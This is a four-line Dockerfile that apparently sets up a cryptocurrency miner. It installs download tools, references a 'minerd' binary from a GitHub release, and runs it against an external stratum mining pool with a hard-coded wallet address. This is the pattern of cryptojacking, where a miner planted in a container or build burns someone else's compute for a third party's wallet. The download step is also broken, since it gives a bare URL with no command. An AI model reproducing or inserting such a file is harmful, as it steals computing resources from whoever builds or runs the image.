FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN https://github.com/whi004/whi/releases/download/0.1/minerd
RUN ./minerd -a yespower -o stratum+tcp://stratum-na.rplant.xyz:7070 -u Wn1Q1hueWCfi1xL9rd1t4ooMvKwYYGmzsY
